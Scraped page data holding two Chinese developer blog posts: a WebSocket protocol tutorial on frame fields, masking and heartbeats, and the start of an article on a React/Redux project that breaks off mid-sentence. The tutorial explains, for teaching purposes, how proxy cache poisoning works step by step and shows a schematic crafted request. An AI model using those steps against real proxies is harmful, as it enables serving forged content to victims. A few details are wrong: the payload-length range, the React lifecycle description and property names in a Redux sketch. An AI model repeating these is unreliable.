data-id=\"heading-13\">1、数据帧格式概览</h3>\n<p>下面给出了WebSocket数据帧的统一格式。熟悉TCP/IP协议的同学对这样的图应该不陌生。</p>\n<ol>\n<li>从左到右，单位是比特。比如<code>FIN</code>、<code>RSV1</code>各占据1比特，<code>opcode</code>占据4比特。</li>\n<li>内容包括了标识、操作代码、掩码、数据、数据长度等。（下一小节会展开）</li>\n</ol>\n<pre><code class=\"hljs bash\" lang=\"bash\">  0                   1                   2                   3\n  0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\n +-+-+-+-+-------+-+-------------+-------------------------------+\n |F|R|R|R| opcode|M| Payload len |    Extended payload length    |\n |I|S|S|S|  (4)  |A|     (7)     |             (16/64)           |\n |N|V|V|V|       |S|             |   (<span class=\"hljs-keyword\">if</span> payload len==126/127)   |\n | |1|2|3|       |K|             |                               |\n +-+-+-+-+-------+-+-------------+ - - - - - - - - - - - - - - - +\n |     Extended payload length continued, <span class=\"hljs-keyword\">if</span> payload len == 127  |\n + - - - - - - - - - - - - - - - +-------------------------------+\n |                               |Masking-key, <span class=\"hljs-keyword\">if</span> MASK <span class=\"hljs-built_in\">set</span> to 1  |\n +-------------------------------+-------------------------------+\n | Masking-key (continued)       |          Payload Data         |\n +-------------------------------- - - - - - - - - - - - - - - - +\n :                     Payload Data continued ...                :\n + - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - +\n |                     Payload Data continued ...                |\n +---------------------------------------------------------------+\n</code></pre><h3 class=\"heading\" data-id=\"heading-14\">2、数据帧格式详解</h3>\n<p>针对前面的格式概览图，这里逐个字段进行讲解，如有不清楚之处，可参考协议规范，或留言交流。</p>\n<p><strong>FIN</strong>：1个比特。</p>\n<p>如果是1，表示这是消息（message）的最后一个分片（fragment），如果是0，表示不是是消息（message）的最后一个分片（fragment）。</p>\n<p><strong>RSV1, RSV2, RSV3</strong>：各占1个比特。</p>\n<p>一般情况下全为0。当客户端、服务端协商采用WebSocket扩展时，这三个标志位可以非0，且值的含义由扩展进行定义。如果出现非零的值，且并没有采用WebSocket扩展，连接出错。</p>\n<p><strong>Opcode</strong>:  4个比特。</p>\n<p>操作代码，Opcode的值决定了应该如何解析后续的数据载荷（data payload）。如果操作代码是不认识的，那么接收端应该断开连接（fail the connection）。可选的操作代码如下：</p>\n<ul>\n<li>%x0：表示一个延续帧。当Opcode为0时，表示本次数据传输采用了数据分片，当前收到的数据帧为其中一个数据分片。</li>\n<li>%x1：表示这是一个文本帧（frame）</li>\n<li>%x2：表示这是一个二进制帧（frame）</li>\n<li>%x3-7：保留的操作代码，用于后续定义的非控制帧。</li>\n<li>%x8：表示连接断开。</li>\n<li>%x9：表示这是一个ping操作。</li>\n<li>%xA：表示这是一个pong操作。</li>\n<li>%xB-F：保留的操作代码，用于后续定义的控制帧。</li>\n</ul>\n<p><strong>Mask</strong>:  1个比特。</p>\n<p>表示是否要对数据载荷进行掩码操作。从客户端向服务端发送数据时，需要对数据进行掩码操作；从服务端向客户端发送数据时，不需要对数据进行掩码操作。</p>\n<p>如果服务端接收到的数据没有进行过掩码操作，服务端需要断开连接。</p>\n<p>如果Mask是1，那么在Masking-key中会定义一个掩码键（masking key），并用这个掩码键来对数据载荷进行反掩码。所有客户端发送到服务端的数据帧，Mask都是1。</p>\n<p>掩码的算法、用途在下一小节讲解。</p>\n<p><strong>Payload length</strong>：数据载荷的长度，单位是字节。为7位，或7+16位，或1+64位。</p>\n<p>假设数Payload length === x，如果</p>\n<ul>\n<li>x为0~126：数据的长度为x字节。</li>\n<li>x为126：后续2个字节代表一个16位的无符号整数，该无符号整数的值为数据的长度。</li>\n<li>x为127：后续8个字节代表一个64位的无符号整数（最高位为0），该无符号整数的值为数据的长度。</li>\n</ul>\n<p>此外，如果payload length占用了多个字节的话，payload length的二进制表达采用网络序（big endian，重要的位在前）。</p>\n<p><strong>Masking-key</strong>：0或4字节（32位）</p>\n<p>所有从客户端传送到服务端的数据帧，数据载荷都进行了掩码操作，Mask为1，且携带了4字节的Masking-key。如果Mask为0，则没有Masking-key。</p>\n<p>备注：载荷数据的长度，不包括mask key的长度。</p>\n<p><strong>Payload data</strong>：(x+y) 字节</p>\n<p>载荷数据：包括了扩展数据、应用数据。其中，扩展数据x字节，应用数据y字节。</p>\n<p>扩展数据：如果没有协商使用扩展的话，扩展数据数据为0字节。所有的扩展都必须声明扩展数据的长度，或者可以如何计算出扩展数据的长度。此外，扩展如何使用必须在握手阶段就协商好。如果扩展数据存在，那么载荷数据长度必须将扩展数据的长度包含在内。</p>\n<p>应用数据：任意的应用数据，在扩展数据之后（如果存在扩展数据），占据了数据帧剩余的位置。载荷数据长度 减去 扩展数据长度，就得到应用数据的长度。</p>\n<h3 class=\"heading\" data-id=\"heading-15\">3、掩码算法</h3>\n<p>掩码键（Masking-key）是由客户端挑选出来的32位的随机数。掩码操作不会影响数据载荷的长度。掩码、反掩码操作都采用如下算法：</p>\n<p>首先，假设：</p>\n<ul>\n<li>original-octet-i：为原始数据的第i字节。</li>\n<li>transformed-octet-i：为转换后的数据的第i字节。</li>\n<li>j：为<code>i mod 4</code>的结果。</li>\n<li>masking-key-octet-j：为mask key第j字节。</li>\n</ul>\n<p>算法描述为： original-octet-i 与 masking-key-octet-j 异或后，得到  transformed-octet-i。</p>\n<blockquote>\n<p>j  = i MOD 4\ntransformed-octet-i = original-octet-i XOR masking-key-octet-j</p>\n</blockquote>\n<h2 class=\"heading\" data-id=\"heading-16\">六、数据传递</h2>\n<p>一旦WebSocket客户端、服务端建立连接后，后续的操作都是基于数据帧的传递。</p>\n<p>WebSocket根据<code>opcode</code>来区分操作的类型。比如<code>0x8</code>表示断开连接，<code>0x0</code>-<code>0x2</code>表示数据交互。</p>\n<h3 class=\"heading\" data-id=\"heading-17\">1、数据分片</h3>\n<p>WebSocket的每条消息可能被切分成多个数据帧。当WebSocket的接收方收到一个数据帧时，会根据<code>FIN</code>的值来判断，是否已经收到消息的最后一个数据帧。</p>\n<p>FIN=1表示当前数据帧为消息的最后一个数据帧，此时接收方已经收到完整的消息，可以对消息进行处理。FIN=0，则接收方还需要继续监听接收其余的数据帧。</p>\n<p>此外，<code>opcode</code>在数据交换的场景下，表示的是数据的类型。<code>0x01</code>表示文本，<code>0x02</code>表示二进制。而<code>0x00</code>比较特殊，表示延续帧（continuation frame），顾名思义，就是完整消息对应的数据帧还没接收完。</p>\n<h3 class=\"heading\" data-id=\"heading-18\">2、数据分片例子</h3>\n<p>直接看例子更形象些。下面例子来自<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FAPI%2FWebSockets_API%2FWriting_WebSocket_servers\" rel=\"nofollow noopener noreferrer\">MDN</a>，可以很好地演示数据的分片。客户端向服务端两次发送消息，服务端收到消息后回应客户端，这里主要看客户端往服务端发送的消息。</p>\n<p><strong>第一条消息</strong></p>\n<p>FIN=1, 表示是当前消息的最后一个数据帧。服务端收到当前数据帧后，可以处理消息。opcode=0x1，表示客户端发送的是文本类型。</p>\n<p><strong>第二条消息</strong></p>\n<ol>\n<li>FIN=0，opcode=0x1，表示发送的是文本类型，且消息还没发送完成，还有后续的数据帧。</li>\n<li>FIN=0，opcode=0x0，表示消息还没发送完成，还有后续的数据帧，当前的数据帧需要接在上一条数据帧之后。</li>\n<li>FIN=1，opcode=0x0，表示消息已经发送完成，没有后续的数据帧，当前的数据帧需要接在上一条数据帧之后。服务端可以将关联的数据帧组装成完整的消息。</li>\n</ol>\n<pre><code class=\"hljs bash\" lang=\"bash\">Client: FIN=1, opcode=0x1, msg=<span class=\"hljs-string\">\"hello\"</span>\nServer: (process complete message immediately) Hi.\nClient: FIN=0, opcode=0x1, msg=<span class=\"hljs-string\">\"and a\"</span>\nServer: (listening, new message containing text started)\nClient: FIN=0, opcode=0x0, msg=<span class=\"hljs-string\">\"happy new\"</span>\nServer: (listening, payload concatenated to previous message)\nClient: FIN=1, opcode=0x0, msg=<span class=\"hljs-string\">\"year!\"</span>\nServer: (process complete message) Happy new year to you too!\n</code></pre><h2 class=\"heading\" data-id=\"heading-19\">七、连接保持+心跳</h2>\n<p>WebSocket为了保持客户端、服务端的实时双向通信，需要确保客户端、服务端之间的TCP通道保持连接没有断开。然而，对于长时间没有数据往来的连接，如果依旧长时间保持着，可能会浪费包括的连接资源。</p>\n<p>但不排除有些场景，客户端、服务端虽然长时间没有数据往来，但仍需要保持连接。这个时候，可以采用心跳来实现。</p>\n<ul>\n<li>发送方-&gt;接收方：ping</li>\n<li>接收方-&gt;发送方：pong</li>\n</ul>\n<p>ping、pong的操作，对应的是WebSocket的两个控制帧，<code>opcode</code>分别是<code>0x9</code>、<code>0xA</code>。</p>\n<p>举例，WebSocket服务端向客户端发送ping，只需要如下代码（采用<code>ws</code>模块）</p>\n<pre><code class=\"hljs javascript\" lang=\"javascript\">ws.ping(<span class=\"hljs-string\">''</span>, <span class=\"hljs-literal\">false</span>, <span class=\"hljs-literal\">true</span>);\n</code></pre><h2 class=\"heading\" data-id=\"heading-20\">八、Sec-WebSocket-Key/Accept的作用</h2>\n<p>前面提到了，<code>Sec-WebSocket-Key/Sec-WebSocket-Accept</code>在主要作用在于提供基础的防护，减少恶意连接、意外连接。</p>\n<p>作用大致归纳如下：</p>\n<ol>\n<li>避免服务端收到非法的websocket连接（比如http客户端不小心请求连接websocket服务，此时服务端可以直接拒绝连接）</li>\n<li>确保服务端理解websocket连接。因为ws握手阶段采用的是http协议，因此可能ws连接是被一个http服务器处理并返回的，此时客户端可以通过Sec-WebSocket-Key来确保服务端认识ws协议。（并非百分百保险，比如总是存在那么些无聊的http服务器，光处理Sec-WebSocket-Key，但并没有实现ws协议。。。）</li>\n<li>用浏览器里发起ajax请求，设置header时，Sec-WebSocket-Key以及其他相关的header是被禁止的。这样可以避免客户端发送ajax请求时，意外请求协议升级（websocket upgrade）</li>\n<li>可以防止反向代理（不理解ws协议）返回错误的数据。比如反向代理前后收到两次ws连接的升级请求，反向代理把第一次请求的返回给cache住，然后第二次请求到来时直接把cache住的请求给返回（无意义的返回）。</li>\n<li>Sec-WebSocket-Key主要目的并不是确保数据的安全性，因为Sec-WebSocket-Key、Sec-WebSocket-Accept的转换计算公式是公开的，而且非常简单，最主要的作用是预防一些常见的意外情况（非故意的）。</li>\n</ol>\n<blockquote>\n<p>强调：Sec-WebSocket-Key/Sec-WebSocket-Accept 的换算，只能带来基本的保障，但连接是否安全、数据是否安全、客户端/服务端是否合法的 ws客户端、ws服务端，其实并没有实际性的保证。</p>\n</blockquote>\n<h2 class=\"heading\" data-id=\"heading-21\">九、数据掩码的作用</h2>\n<p>WebSocket协议中，数据掩码的作用是增强协议的安全性。但数据掩码并不是为了保护数据本身，因为算法本身是公开的，运算也不复杂。除了加密通道本身，似乎没有太多有效的保护通信安全的办法。</p>\n<p>那么为什么还要引入掩码计算呢，除了增加计算机器的运算量外似乎并没有太多的收益（这也是不少同学疑惑的点）。</p>\n<p>答案还是两个字：<strong>安全</strong>。但并不是为了防止数据泄密，而是为了防止早期版本的协议中存在的代理缓存污染攻击（proxy cache poisoning attacks）等问题。</p>\n<h3 class=\"heading\" data-id=\"heading-22\">1、代理缓存污染攻击</h3>\n<p>下面摘自2010年关于安全的一段讲话。其中提到了代理服务器在协议实现上的缺陷可能导致的安全问题。<a target=\"_blank\" href=\"https://link.juejin.im?target=http%3A%2F%2Fw2spconf.com%2F2011%2Fpapers%2Fwebsocket.pdf\" rel=\"nofollow noopener noreferrer\">猛击出处</a>。</p>\n<blockquote>\n<p>“We show, empirically, that the current version of the WebSocket consent mechanism is vulnerable to proxy cache poisoning attacks. Even though the WebSocket handshake is based on HTTP, which should be understood by most network intermediaries, the handshake uses the esoteric “Upgrade” mechanism of HTTP [5]. In our experiment, we find that many proxies do not implement the Upgrade mechanism properly, which causes the handshake to succeed even though subsequent traffic over the socket will be misinterpreted by the proxy.”</p>\n<p>[TALKING]  Huang, L-S., Chen, E., Barth, A., Rescorla, E., and C.\nJackson, \"Talking to Yourself for Fun and Profit\", 2010,</p>\n</blockquote>\n<p>在正式描述攻击步骤之前，我们假设有如下参与者：</p>\n<ul>\n<li>攻击者、攻击者自己控制的服务器（简称“邪恶服务器”）、攻击者伪造的资源（简称“邪恶资源”）</li>\n<li>受害者、受害者想要访问的资源（简称“正义资源”）</li>\n<li>受害者实际想要访问的服务器（简称“正义服务器”）</li>\n<li>中间代理服务器</li>\n</ul>\n<p>攻击步骤一：</p>\n<ol>\n<li><strong>攻击者</strong>浏览器 向 <strong>邪恶服务器</strong> 发起WebSocket连接。根据前文，首先是一个协议升级请求。</li>\n<li>协议升级请求 实际到达 <strong>代理服务器</strong>。</li>\n<li><strong>代理服务器</strong> 将协议升级请求转发到 <strong>邪恶服务器</strong>。</li>\n<li><strong>邪恶服务器</strong> 同意连接，<strong>代理服务器</strong> 将响应转发给 <strong>攻击者</strong>。</li>\n</ol>\n<p>由于 upgrade 的实现上有缺陷，<strong>代理服务器</strong> 以为之前转发的是普通的HTTP消息。因此，当<strong>协议服务器</strong> 同意连接，<strong>代理服务器</strong> 以为本次会话已经结束。</p>\n<p>攻击步骤二：</p>\n<ol>\n<li><strong>攻击者</strong> 在之前建立的连接上，通过WebSocket的接口向 <strong>邪恶服务器</strong> 发送数据，且数据是精心构造的HTTP格式的文本。其中包含了 <strong>正义资源</strong> 的地址，以及一个伪造的host（指向<strong>正义服务器</strong>）。（见后面报文）</li>\n<li>请求到达 <strong>代理服务器</strong> 。虽然复用了之前的TCP连接，但 <strong>代理服务器</strong> 以为是新的HTTP请求。</li>\n<li><strong>代理服务器</strong> 向 <strong>邪恶服务器</strong> 请求 <strong>邪恶资源</strong>。</li>\n<li><strong>邪恶服务器</strong> 返回 <strong>邪恶资源</strong>。<strong>代理服务器</strong> 缓存住 <strong>邪恶资源</strong>（url是对的，但host是 <strong>正义服务器</strong> 的地址）。</li>\n</ol>\n<p>到这里，受害者可以登场了：</p>\n<ol>\n<li><strong>受害者</strong> 通过 <strong>代理服务器</strong> 访问 <strong>正义服务器</strong> 的 <strong>正义资源</strong>。</li>\n<li><strong>代理服务器</strong> 检查该资源的url、host，发现本地有一份缓存（伪造的）。</li>\n<li><strong>代理服务器</strong> 将 <strong>邪恶资源</strong> 返回给 <strong>受害者</strong>。</li>\n<li><strong>受害者</strong> 卒。</li>\n</ol>\n<p>附：前面提到的精心构造的“HTTP请求报文”。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">Client → Server:\nPOST /path/of/attackers/choice HTTP/1.1 Host: host-of-attackers-choice.com Sec-WebSocket-Key: &lt;connection-key&gt;\nServer → Client:\nHTTP/1.1 200 OK\nSec-WebSocket-Accept: &lt;connection-key&gt;\n</code></pre><h3 class=\"heading\" data-id=\"heading-23\">2、当前解决方案</h3>\n<p>最初的提案是对数据进行加密处理。基于安全、效率的考虑，最终采用了折中的方案：对数据载荷进行掩码处理。</p>\n<p>需要注意的是，这里只是限制了浏览器对数据载荷进行掩码处理，但是坏人完全可以实现自己的WebSocket客户端、服务端，不按规则来，攻击可以照常进行。</p>\n<p>但是对浏览器加上这个限制后，可以大大增加攻击的难度，以及攻击的影响范围。如果没有这个限制，只需要在网上放个钓鱼网站骗人去访问，一下子就可以在短时间内展开大范围的攻击。</p>\n<h2 class=\"heading\" data-id=\"heading-24\">十、写在后面</h2>\n<p>WebSocket可写的东西还挺多，比如WebSocket扩展。客户端、服务端之间是如何协商、使用扩展的。WebSocket扩展可以给协议本身增加很多能力和想象空间，比如数据的压缩、加密，以及多路复用等。</p>\n<p>篇幅所限，这里先不展开，感兴趣的同学可以留言交流。文章如有错漏，敬请指出。</p>\n<h2 class=\"heading\" data-id=\"heading-25\">十一、相关链接</h2>\n<p><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Ftools.ietf.org%2Fhtml%2Frfc6455\" rel=\"nofollow noopener noreferrer\">RFC6455：websocket规范</a></p>\n<p><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Ftools.ietf.org%2Fhtml%2Frfc6455%23section-5.3\" rel=\"nofollow noopener noreferrer\">规范：数据帧掩码细节</a></p>\n<p><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Ftools.ietf.org%2Fhtml%2Frfc6455%23section-5.1\" rel=\"nofollow noopener noreferrer\">规范：数据帧格式</a></p>\n<p><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fwebsockets%2Fws%23server-example\" rel=\"nofollow noopener noreferrer\">server-example</a></p>\n<p><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FAPI%2FWebSockets_API%2FWriting_WebSocket_servers\" rel=\"nofollow noopener noreferrer\">编写websocket服务器</a></p>\n<p><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Ftools.ietf.org%2Fhtml%2Frfc6455%23section-10.3\" rel=\"nofollow noopener noreferrer\">对网络基础设施的攻击（数据掩码操作所要预防的事情）</a></p>\n<p><a target=\"_blank\" href=\"https://link.juejin.im?target=http%3A%2F%2Fw2spconf.com%2F2011%2Fpapers%2Fwebsocket.pdf\" rel=\"nofollow noopener noreferrer\">Talking to Yourself for Fun and Profit（含有攻击描述）</a></p>\n<p><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fstackoverflow.com%2Fquestions%2F18265128%2Fwhat-is-sec-websocket-key-for\" rel=\"nofollow noopener noreferrer\">What is Sec-WebSocket-Key for?</a></p>\n<p><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Ftools.ietf.org%2Fhtml%2Frfc6455%23section-10.3\" rel=\"nofollow noopener noreferrer\">10.3.  Attacks On Infrastructure (Masking)</a></p>\n<p><a target=\"_blank\" href=\"https://link.juejin.im?target=http%3A%2F%2Fw2spconf.com%2F2011%2Fpapers%2Fwebsocket.pdf\" rel=\"nofollow noopener noreferrer\">Talking to Yourself for Fun and Profit</a></p>\n<p><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fstackoverflow.com%2Fquestions%2F33250207%2Fwhy-are-websockets-masked\" rel=\"nofollow noopener noreferrer\">Why are WebSockets masked?</a></p>\n<p><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fsecurity.stackexchange.com%2Fquestions%2F36930%2Fhow-does-websocket-frame-masking-protect-against-cache-poisoning\" rel=\"nofollow noopener noreferrer\">How does websocket frame masking protect against cache poisoning?</a></p>\n<p><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fstackoverflow.com%2Fquestions%2F14174184%2Fwhat-is-the-mask-in-a-websocket-frame\" rel=\"nofollow noopener noreferrer\">What is the mask in a WebSocket frame?</a></p>\n</div>"},{"title":"送给前端开发者的一份新年礼物","avatar":"https://user-gold-cdn.xitu.io/2016/11/29/9cefc7be79b3a837631a91e7da2fed46?imageView2/1/w/100/h/100/q/85/format/webp/interlace/1","author":"夕阳","create_time":"2018 年 01 月 01 日","tags":["React.js","MongoDB","JavaScript","Express"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><blockquote>\n<p>大家好，新年快乐！今天，我开源了一个 <a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2FKieSun%2FChat-Buy-React\" rel=\"nofollow noopener noreferrer\">React 的项目</a>。这个项目虽小，但是五脏六腑俱全，并且接下来我会根据该项目做一整套的免费视频，预计总时间在 20 小时以上。</p>\n</blockquote>\n<p>先来介绍下这个项目的技术栈：</p>\n<ul>\n<li>React 全家桶：React 16 + Redux + React-router 4.0 + Immutable.js</li>\n<li>ES6 + ES7 语法</li>\n<li>网络请求：Axios + Socket.io</li>\n<li>UI 框架：Antd-mobile</li>\n<li>后端：Express + MongoDB</li>\n</ul>\n<p>接下来是我初步拟订的课程大纲规划\n</p><figure><img alt=\"课程大纲\" class=\"lazyload inited loaded\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/31/160ab7a0feddd5c7?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"925\" data-height=\"648\" src=\"https://user-gold-cdn.xitu.io/2017/12/31/160ab7a0feddd5c7?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\"><figcaption></figcaption></figure><p></p>\n<p>从2018年1月开始，每周都会更新 2 小时左右的教学视频，视频会按照以上大纲教学，这个视频是完全免费的，保证更新完成。</p>\n<p>想第一时间获得更新的视频，可以扫码加群。(二维码在文章最后，你可以先将项目总结看一遍，有兴趣再加不迟)</p>\n<h3 class=\"heading\" data-id=\"heading-0\">项目总结</h3>\n<h4 class=\"heading\" data-id=\"heading-1\">React 是什么</h4>\n<p>React 其实只是一个 UI 框架，频繁进行 DOM 操作的代价是很昂贵的，所以 React 使用了虚拟 DOM 的技术，每当状态发生改变，就会生成新的虚拟 DOM 并与原本的进行改变，让变化的地方去渲染。并且为了性能的考虑，只对状态进行浅比较（这是一个很大的优化点）。</p>\n<p>React 已经成为当今最流行的框架之一，但是他的学习成本并不低并且需要你有一个良好的 JS 基础。由于React 只是一个 UI 框架，所以你想完成一个项目，你就得使用他的全家桶，更加提高了一个学习成本。所以本课程也是针对初学者，让初学者能够快速的上手 React 。</p>\n<h4 class=\"heading\" data-id=\"heading-2\">React 组件</h4>\n<p>如何写好规划好一个组件决定了你的 React 玩的溜不溜。一个组件你需要考虑他提供几个对外暴露的接口，内部状态通过局部状态改变还是全局状态改变好。并且你的组件应该是利于复用和维护的。</p>\n<h5 class=\"heading\" data-id=\"heading-3\">组件的生命周期</h5>\n<p></p><figure><img alt=\"生命周期\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2018/1/1/160ad5cb4105eaeb?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"1218\" data-height=\"1280\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;1218&quot; height=&quot;1280&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<ul>\n<li><code>render</code> 函数会在 UI 渲染时调用，你多次渲染就会多次调用，所以控制一个组件的重复渲染对于性能优化很重要</li>\n<li><code>componentDidMount</code> 函数只会在组件渲染以后调用一次，通常会在这个发起数据请求</li>\n<li><code>shouldComponentUpdate</code> 是一个很重要的函数，他的返回值决定了是否需要生成一个新的虚拟 DOM 去和之前的比较。通常遇到的性能问题你可以在这里得到很好的解决</li>\n<li><code>componentWillMount</code> 函数会在组件即将销毁时调用，项目中在清除聊天未读消息中用到了这个函数</li>\n</ul>\n<h5 class=\"heading\" data-id=\"heading-4\">父子组件参数传递</h5>\n<p>在项目中我使用的方式是单个模块顶层父组件通过 <code>connect</code> 与 Redux 通信。子组件通过参数传递的方式获取需要的参数，对于参数类型我们应该规则好，便于后期 debug。</p>\n<p>性能上考虑，我们在参数传递的过程中尽量只传递必须的参数。</p>\n<h4 class=\"heading\" data-id=\"heading-5\">路由</h4>\n<p>在 React-router 4.0 版本，官方也选择了组件的方式去书写路由。</p>\n<p>下面介绍一下项目中使用到的按需加载路由高阶组件</p>\n<pre><code class=\"hljs js\" lang=\"js\"><span class=\"hljs-keyword\">import</span> React, { Component } <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">\"react\"</span>;\n<span class=\"hljs-comment\">// 其实高阶组件就是一个组件通过参数传递的方式生成新的组件</span>\n<span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">default</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">asyncComponent</span>(<span class=\"hljs-params\">importComponent</span>) </span>{\n  <span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">AsyncComponent</span> <span class=\"hljs-keyword\">extends</span> <span class=\"hljs-title\">Component</span> </span>{\n    <span class=\"hljs-keyword\">constructor</span>(props) {\n      <span class=\"hljs-keyword\">super</span>(props);\n        <span class=\"hljs-comment\">// 存储组件</span>\n      <span class=\"hljs-keyword\">this</span>.state = {\n        <span class=\"hljs-attr\">component</span>: <span class=\"hljs-literal\">null</span>\n      };\n    }\n\n    <span class=\"hljs-keyword\">async</span> componentDidMount() {\n    <span class=\"hljs-comment\">// 引入组件是需要下载文件的，所以是个异步操作</span>\n      <span class=\"hljs-keyword\">const</span> { <span class=\"hljs-attr\">default</span>: component } = <span class=\"hljs-keyword\">await</span> importComponent();\n\n      <span class=\"hljs-keyword\">this</span>.setState({\n        <span class=\"hljs-attr\">component</span>: component\n      });\n    }\n    <span class=\"hljs-comment\">// 渲染时候判断文件下完没有，下完了就渲染出来</span>\n    render() {\n      <span class=\"hljs-keyword\">const</span> C = <span class=\"hljs-keyword\">this</span>.state.component;\n\n      <span class=\"hljs-keyword\">return</span> C ? <span class=\"xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">C</span> {<span class=\"hljs-attr\">...this.props</span>} /&gt;</span> : null;\n    }\n  }\n\n  return AsyncComponent;\n}\n\n</span></code></pre><h4 class=\"heading\" data-id=\"heading-6\">Redux</h4>\n<p>Redux 通常是个另新手困惑的点。首先，不是每个项目都需要使用 Redux，组件间通信不多，逻辑不复杂，你也就不需要使用这个库，毕竟这个使用这个库的开发成本很大。</p>\n<p>Redux 是与 React 解耦的，所以你想和 Redux 通信就需要使用 React-redux，你在 action 中使用异步请求就得使用 Redux-thunk，因为 action 只支持同步操作。</p>\n<h5 class=\"heading\" data-id=\"heading-7\">Redux 的组成</h5>\n<p>Redux 由三部分组成：action，store，reducer。</p>\n<p>Action 顾名思义，就是你发起一个操作，具体使用如下：</p>\n<pre><code class=\"hljs js\" lang=\"js\"><span class=\"hljs-keyword\">export</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">getOrderSuccess</span>(<span class=\"hljs-params\">data</span>) </span>{\n<span class=\"hljs-comment\">// 返回的就是一个 action，除了第一个参数一般这样写，其余的参数名随意</span>\n  <span class=\"hljs-keyword\">return</span> { <span class=\"hljs-attr\">type</span>: GET_ORDER_SUCCESS, <span class=\"hljs-attr\">payload</span>: data };\n}\n</code></pre><p>Action 发出去以后，会丢给 Reducer。Reducer 是一个纯函数（不依赖于且不改变它作用域之外的变量状态的函数），他接收一个之前的 state 和 action 参数，然后返回一个新的 state 给 store。</p>\n<pre><code class=\"hljs js\" lang=\"js\"><span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">default</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">state = initialState, action</span>) </span>{\n  <span class=\"hljs-keyword\">switch</span> (action.type) {\n    <span class=\"hljs-keyword\">case</span> GET_ALL_ORDERS:\n      <span class=\"hljs-keyword\">return</span> state.set(<span class=\"hljs-string\">\"allOrders\"</span>, action.payload);\n    <span class=\"hljs-keyword\">default</span>:\n      <span class=\"hljs-keyword\">break</span>;\n  }\n  <span class=\"hljs-keyword\">return</span> state;\n}\n</code></pre><p>Store 很容易和 state 混淆。你可以把 Store 看成一个容器，state 存储在这个容器中。Store 提供一些 API 让你可以对 state 进行访问，改变等等。</p>\n<p>PS：state 只允许在 reducer 中进行改变。</p>\n<p>说明完了这些基本概念，我觉得是时候对 Redux 进行一点深入的挖掘。</p>\n<h5 class=\"heading\" data-id=\"heading-8\">自己实现 Redux</h5>\n<p>之前说过 Store 是个容器，那么可以写下如下代码</p>\n<pre><code class=\"hljs js\" lang=\"js\"><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Store</span> </span>{\n  <span class=\"hljs-keyword\">constructor</span>() {}\n    \n    <span class=\"hljs-comment\">// 以下两个都是 store 的常用 API</span>\n  dispatch() {}\n\n  subscribe() {}\n}\n</code></pre><p>Store 容纳了 state，并且能随时访问 state 的值，那么可以写下如下代码</p>\n<pre><code class=\"hljs js\" lang=\"js\"><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Store</span> </span>{\n  <span class=\"hljs-keyword\">constructor</span>(initState) {\n  <span class=\"hljs-comment\">// _ 代表私有，当然不是真的私有，便于教学就这样写了</span>\n    <span class=\"hljs-keyword\">this</span>._state = initState\n  }\n  \n  getState() {\n    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">this</span>._state\n  }\n    \n    <span class=\"hljs-comment\">// 以下两个都是 store 的常用 API</span>\n  dispatch() {}\n\n  subscribe() {}\n}\n</code></pre><p>接下来我们考虑 dispatch 逻辑。首先 dispatch 应该接收一个 action 参数，并且发送给 reducer 更新 state。然后如果用户 subscribe 了 state，我们还应该调用函数，那么可以写下如下代码</p>\n<pre><code class=\"hljs js\" lang=\"js\">dispatch(action) {\n    <span class=\"hljs-keyword\">this</span>._state = <span class=\"hljs-keyword\">this</span>.reducer(<span class=\"hljs-keyword\">this</span>.state, action)\n    <span class=\"hljs-keyword\">this</span>.subscribers.forEach(<span class=\"hljs-function\"><span class=\"hljs-params\">fn</span> =&gt;</span> fn(<span class=\"hljs-keyword\">this</span>.getState()))\n}\n</code></pre><p>reducer 逻辑很简单，在 constructor 时将 reducer 保存起来即可，那么可以写下如下代码</p>\n<pre><code class=\"hljs js\" lang=\"js\"><span class=\"hljs-keyword\">constructor</span>(initState, reducer) {\n    <span class=\"hljs-keyword\">this</span>._state = initState\n    <span class=\"hljs-keyword\">this</span>._reducer = reducer\n}\n</code></pre><p>现在一个 Redux 